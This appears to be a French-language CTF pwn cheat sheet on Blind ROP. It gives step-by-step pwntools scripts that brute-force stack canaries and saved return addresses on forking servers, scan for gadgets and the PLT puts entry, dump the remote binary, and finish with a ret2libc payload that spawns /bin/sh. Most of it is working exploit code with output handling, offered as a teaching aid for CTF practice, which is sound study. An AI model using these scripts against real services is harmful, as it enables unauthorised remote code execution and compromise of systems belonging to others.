# CTF Pwn — Blind ROP (BROP)

Technique d'exploitation d'un service sans accès au binaire. On sonde le comportement via les crashes pour construire un exploit complet.

## Concept

BROP (Blind Return-Oriented Programming) exploite des serveurs qui :
1. **Fork** à chaque connexion (même ASLR, même canary entre forks)
2. **Crashent** sur un mauvais payload (connexion fermée)
3. **Continuent** si le payload est correct (connexion maintenue)

La randomisation ASLR ne change pas entre les forks → on peut bruteforcer adresse par adresse.

## Étapes BROP

```
1. Trouver l'offset du buffer overflow
2. Leaker le canary (si présent) byte par byte
3. Leaker l'adresse de retour sauvegardée → calculer PIE base
4. Trouver des gadgets : stop gadget, pop gadget (BROP gadget)
5. Trouver puts() ou write() dans la PLT
6. Dump le binaire via puts(addr, len)
7. Construire l'exploit complet depuis le binaire dumpé
```

---

## Phase 1 : Trouver l'offset du buffer overflow

```python
from pwn import *

HOST, PORT = 'target', 1337

def try_payload(payload):
    """Retourne True si la connexion reste ouverte (pas de crash)"""
    try:
        io = remote(HOST, PORT)
        io.sendline(payload)
        # Essayer de recevoir une réponse
        io.recv(timeout=1)
        io.close()
        return True  # Vivant
    except:
        return False  # Crash

# Trouver la taille du buffer
for size in range(1, 500):
    payload = b'A' * size
    if not try_payload(payload):
        # Crash à cette taille : buffer = size - 1
        print(f"[+] Buffer size: {size - 1}")
        buffer_size = size - 1
        break
```

## Phase 2 : Leak du canary (si présent)

```python
# Canary : 8 bytes, byte le plus bas toujours \x00 en x64
# On bruteforce byte par byte après le buffer

canary = b'\x00'  # Premier byte connu

for byte_idx in range(1, 8):  # 7 bytes restants
    for byte_val in range(256):
        # Envoyer : buffer + canary_partiel + byte_test + padding jusqu'à ret
        test_payload = b'A' * buffer_size + canary + bytes([byte_val])
        
        # Si pas de crash → byte correct
        if try_payload(test_payload):
            canary += bytes([byte_val])
            print(f"[+] Canary byte {byte_idx}: {hex(byte_val)}")
            break

print(f"[+] Canary: {hex(u64(canary))}")
```

## Phase 3 : Leak de l'adresse de retour (PIE bypass)

```python
# Après le canary, saved RBP (8 bytes), puis saved RIP (adresse retour)
# Lire saved RIP byte par byte pour leaker l'adresse de code

saved_rip = b''
for byte_idx in range(6):  # 6 bytes significatifs (adresse 48-bit)
    for byte_val in range(256):
        # Tenter un overwrite partiel : garder les bytes précédents + tester le nouveau
        test = b'A' * buffer_size + canary + p64(0)  # fake RBP
        test += saved_rip + bytes([byte_val])
        
        # stop_gadget : une adresse qui fait continuer le programme (pas crash)
        # Pour phase 3, on cherche juste à ne pas crasher → utiliser \x00 bytes
        # L'adresse de retour doit être valide → essayer de trouver une bonne addr
        
        # Heuristique : une adresse qui retourne dans main est valide
        # On la trouve si try_payload retourne True avec une adresse mappée
        if try_payload(test + bytes([0x00] * (6 - byte_idx - 1))):
            saved_rip += bytes([byte_val])
            break

pie_base = u64(saved_rip.ljust(8, b'\x00')) - known_offset  # offset de main par ex
print(f"[+] PIE base: {hex(pie_base)}")
```

## Phase 4 : Trouver le BROP Gadget et Stop Gadget

### Stop Gadget

Un "stop gadget" est une adresse qui, quand utilisée comme adresse de retour, ne fait **pas** crasher le programme (ex: `_start`, `main`, boucle infinie).

```python
def find_stop_gadget(pie_base, canary, rbp_offset):
    """Cherche une adresse qui ne crashe pas quand utilisée comme RIP"""
    found_stops = []
    
    # Scanner le texte du binaire pour des stop gadgets
    for offset in range(0, 0x10000, 1):
        addr = pie_base + offset
        payload = b'A' * buffer_size + canary + p64(0) + p64(addr)
        
        if try_payload(payload):
            print(f"[+] Stop gadget candidat: {hex(addr)}")
            found_stops.append(addr)
            
            if len(found_stops) >= 5:
                break
    
    return found_stops[0] if found_stops else None
```

### BROP Gadget

Le gadget `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret` (fin de `__libc_csu_init`) pop 6 registres → si utilisé comme RIP, pop 6 valeurs de la pile avant de retourner vers le stop gadget.

```python
def find_brop_gadget(pie_base, canary, stop_gadget):
    """
    BROP gadget : pop 6 registres (ret survit si stop gadget après)
    vs gadget pop 1 : survivrait aussi mais n'est pas aussi utile
    Différencier via le nombre d'arguments sur la pile
    """
    
    for offset in range(0, 0x10000, 1):
        addr = pie_base + offset
        
        # Test : addr + 6 * 0 + stop_gadget
        # Un gadget qui pop N registres : besoin de N valeurs junk après addr
        # Si N=6 : survivre avec 6 junk values → c'est le BROP gadget
        
        payload_6 = b'A' * buffer_size + canary + p64(0)
        payload_6 += p64(addr)           # gadget testé
        payload_6 += p64(0) * 6         # 6 valeurs junk
        payload_6 += p64(stop_gadget)    # doit atteindre stop_gadget
        
        # Test avec 5 valeurs junk (doit crasher si le gadget pop 6)
        payload_5 = b'A' * buffer_size + canary + p64(0)
        payload_5 += p64(addr)
        payload_5 += p64(0) * 5
        payload_5 += p64(stop_gadget)
        
        survives_6 = try_payload(payload_6)
        survives_5 = try_payload(payload_5)
        
        # Un gadget pop 6 : survit avec 6 junk, crashe avec 5
        if survives_6 and not survives_5:
            print(f"[+] BROP gadget: {hex(addr)}")
            return addr
    
    return None
```

## Phase 5 : Trouver write() ou puts() dans la PLT

```python
def find_plt_function(pie_base, canary, brop_gadget, stop_gadget, write_fd=1):
    """
    Scanner la PLT pour trouver write() ou puts()
    write(fd=1, buf, len) : si buf pointe vers la pile → sortie visible
    """
    
    # pop rdi; ret (offset +9 depuis BROP gadget dans __libc_csu_init)
    pop_rdi = brop_gadget + 9
    # pop rsi; pop r15; ret (offset +7 depuis BROP gadget)
    pop_rsi_r15 = brop_gadget + 7
    
    # PLT est généralement à un offset fixe depuis pie_base
    plt_base = pie_base + 0x400  # approximatif, scanner
    
    for plt_offset in range(0, 0x1000, 0x10):  # Entrées PLT = 16 bytes
        plt_entry = plt_base + plt_offset
        
        # Tenter d'appeler puts(ptr_to_known_string)
        # Si ça retourne data → c'est puts/write
        payload = b'A' * buffer_size + canary + p64(0)
        payload += p64(pop_rdi)
        payload += p64(pie_base)     # arg1 = adresse avec data connue ("\x7fELF")
        payload += p64(plt_entry)    # call PLT entry
        payload += p64(stop_gadget)  # retour après
        
        io = remote(HOST, PORT)
        io.sendline(payload)
        
        try:
            data = io.recv(timeout=2)
            if b'\x7fELF' in data or len(data) > 4:
                print(f"[+] puts() ou write() trouvé en PLT: {hex(plt_entry)}")
                io.close()
                return plt_entry
        except:
            pass
        io.close()
    
    return None
```

## Phase 6 : Dumper le binaire

```python
def dump_binary(pie_base, canary, pop_rdi, puts_plt, stop_gadget):
    """
    Lire le binaire complet via puts() pour analyse statique
    """
    binary = b''
    
    for addr in range(pie_base, pie_base + 0x10000, 0x40):
        payload = b'A' * buffer_size + canary + p64(0)
        payload += p64(pop_rdi)
        payload += p64(addr)        # adresse à lire
        payload += p64(puts_plt)    # puts(addr)
        payload += p64(stop_gadget)  # continuer après
        
        io = remote(HOST, PORT)
        io.sendline(payload)
        
        # puts() s'arrête au premier \x00 → remettre manuellement
        chunk = io.recvline(keepends=False)
        chunk += b'\x00'  # puts a coupé ici
        
        # Paddé à 0x40 bytes (taille demandée)
        chunk = chunk.ljust(0x40, b'\x00')
        binary += chunk[:0x40]
        
        io.close()
    
    # Sauvegarder le binaire pour analyse avec Ghidra/radare2
    with open('dumped.bin', 'wb') as f:
        f.write(binary)
    
    print(f"[+] Binaire dumpé: {len(binary)} bytes → dumped.bin")
    return binary
```

## Phase 7 : Construire l'exploit final

```python
# Après avoir dumpé le binaire :
# 1. Analyser dans Ghidra/radare2 → trouver les vrais offsets
# 2. Identifier puts@GOT ou autres GOT entries pour leak libc
# 3. Construire ret2libc classique

from pwn import *

# Charger le binaire dumpé
elf = ELF('./dumped.bin')
elf.address = pie_base

# Ret2libc complet
libc = ELF('./libc.so.6')
pop_rdi = elf.address + 0x...  # depuis analyse Ghidra

payload = b'A' * buffer_size + canary + p64(0)
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

io = remote(HOST, PORT)
io.sendline(payload)
puts_leak = u64(io.recvn(8))
libc.address = puts_leak - libc.symbols['puts']

system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh'))

payload2 = b'A' * buffer_size + canary + p64(0)
payload2 += p64(pop_rdi) + p64(binsh) + p64(system)

io.sendline(payload2)
io.interactive()
```

## Optimisations BROP

```python
# 1. Paralléliser les connexions pour accélérer le bruteforce
from concurrent.futures import ThreadPoolExecutor

def try_byte(args):
    offset, byte_val, current = args
    payload = b'A' * buffer_size + current + bytes([byte_val])
    return byte_val if try_payload(payload) else None

with ThreadPoolExecutor(max_workers=16) as ex:
    results = list(ex.map(try_byte, [(offset, b, current) for b in range(256)]))
    found = next(r for r in results if r is not None)

# 2. Binary search sur les adresses (au lieu de scan linéaire)
# Pour les stop gadgets : scanner par blocs de 0x100 d'abord

# 3. Caching des résultats intermédiaires
import pickle
try:
    state = pickle.load(open('brop_state.pkl', 'rb'))
except:
    state = {}

# Sauvegarder après chaque découverte importante
state['canary'] = canary
pickle.dump(state, open('brop_state.pkl', 'wb'))
```

## BROP vs serveurs sans fork (ASLR change à chaque connexion)

```python
# Sans fork : ASLR différent à chaque connexion → pas de bruteforce possible
# Alternatives :
# 1. Trouver un info-leak dans le protocole (HTTP headers, error messages)
# 2. Chercher une adresse partiellement overwritable (partial overwrite 12 bits fixes)
# 3. Non-PIE binary → adresses fixes malgré ASLR
# 4. Heap base leak via timing ou output

# Partial overwrite (12 bits fixes car alignement page)
# Overwrite 2 bytes du saved RIP (1 bit d'entropie pour le nibble)
for nibble in range(16):
    payload = b'A' * buffer_size + p16((known_low_12 & 0xff0) | nibble)
    if try_payload(payload):
        print(f"Nibble trouvé: {nibble}")
```
